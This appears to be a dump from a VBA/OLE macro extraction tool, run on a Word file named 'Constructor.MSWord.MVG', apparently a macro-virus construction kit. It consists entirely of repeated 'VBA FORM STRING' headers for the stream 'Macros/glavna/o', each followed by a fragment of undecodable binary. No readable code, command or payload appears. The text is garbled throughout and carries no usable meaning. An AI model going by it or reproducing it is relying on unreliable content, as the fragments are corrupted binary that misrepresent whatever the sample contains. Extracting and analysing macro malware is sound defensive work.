VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Δ!�{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ޥ)��!��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
֥!sZ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
֭)��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ֵ)έ!��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��!ε!�s
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��!��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��!ƽ!��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��!ss
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*\Ȱ�Ç
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#J�H��ŋ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3j�ȱ��|O�1s�/ߥ[
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�e(��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>~���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��!Є�;��Q�g
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�J�y汪ժL!�ķ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��o_�|L	��J��ر5�^�K
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!ӻ%/
�7`��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�${�-�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`͂E�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

`pP�:�l
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ŋ��g�yC[,�����5H�;�o�5c{"�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
uO�͜Y)�D+�	�QR�`ɀO
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%o�vD
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�N��A�G
�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9��|�3ųv
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z��:^<���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ޔ;p0A�M��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��`}�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�v�g��H|(H2�M
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/���L
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
G�X05�L?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� 0�)����	@! �1��U
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|����ww�ؔz�Y�YG�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4^y;
�cw9.$�>
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,���-�$�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{%�4&Wd��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S
|���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�큉�#ᔡ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����ь!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D��7�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��8v  
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"� �D>
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�4��"��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5��1n`q�-x0��5��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�8|`�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,밥�=�t��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q�7�L!E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�x��7A0U
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4��4�8g`Ѐ��DU��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
w����Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|���A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��0WE�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\�R�W&;�L!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B�7�M��#�4!�(�$�E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��,��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�R{!���Q��z~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�=6]v+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�$��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�-LaP*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
xh�:5
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���&� �#1�`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;40ŏ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i�c�ݤ_�V
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*.�b�l�U�M
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V{1�Y���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d��a����q����aљ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_޸'4��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�)�Y�۔��ۋ�WA
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;}��7l(��k�I!J3J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�׎�Â
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���D��r8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;���z�'�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��IDK��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���0!ZB݊��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��{�a���#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��0�YJ[�d����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n	K���<��e+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Έr�!�(�=�|�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H?���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z��|�c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��
~�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�� �Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$*�$��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�\0�0�h�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�
b��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��z�	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x�5��	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
vLH>4
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�A�o�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(�h�5D $
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�� ±���C
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�h�E���dt�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z�I�r���L�:���v�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Pg�.)T�Mdɉ|�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Vŀ��\<Р<9��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��%%)�9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�K��.BHʎ�2�B�&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q�q�i�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����f
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
X 3#��K@�'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�x3�8�$2�!�u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��A��I�P-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�R�	�����M�j°�eHuSZ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$�&�9h���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��}(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
YYkC��֍X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T��@&P
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`�U!�#zj*�e�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{���l��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
رn �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
钹�d�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=٤d��QaȆ=�uW4�;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t��#�nD�g#�d���}
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�	�Ifv�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��u"O�XW
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
DM��/W��^!E�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d]�*'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��s8�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��\�:��u#�)m{�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��D�)9NH~ڛ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ȱ�[H"dL	�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0�C�lb�Mԣ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\�B���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ձM�!K1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Mζ��x0% $�@���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)l�Ň
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>�2�y�O�$�&�h�+�V�%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��y1L�|��5�����n��Kj��:#��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��TW�-��R\|�%܈�0�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��w��Ns��G��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
